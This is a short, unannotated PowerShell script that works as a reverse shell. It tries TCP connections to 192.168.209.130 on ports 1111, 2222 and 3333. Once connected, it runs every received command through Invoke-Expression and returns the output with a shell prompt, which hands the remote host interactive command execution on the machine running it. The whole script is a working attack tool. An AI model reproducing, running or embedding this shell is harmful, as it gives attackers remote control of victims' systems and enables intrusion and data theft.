$Ports = '1111', '2222', '3333'
$Target = '192.168.209.130'

ForEach ($T in $Target)
{
	ForEach ($P in $Ports)
	{
		Write-Output "[*] Contacting $($T+':'+$P)"
		Try
		{
			$client = New-Object System.Net.Sockets.TCPClient($T, $P);
			$stream = $client.GetStream();
			[byte[]]$bytes = 0 .. 65535 | %{ 0 };
			while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
			{
				$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
				$sendback = (iex $data 2>&1 | Out-String)
				$sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
				$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
				$stream.Write($sendbyte, 0, $sendbyte.Length)
				$stream.Flush()
			}
			$client.Close()
		}
		Catch
		{
			If ($($_.Exception.Message) -like "*actively refused*")
			{
				Write-Output '[!] Failed..Trying next'
			}
			Else
			{
                Write-Output $_.Exception.Message
			}
		}
	}
} 
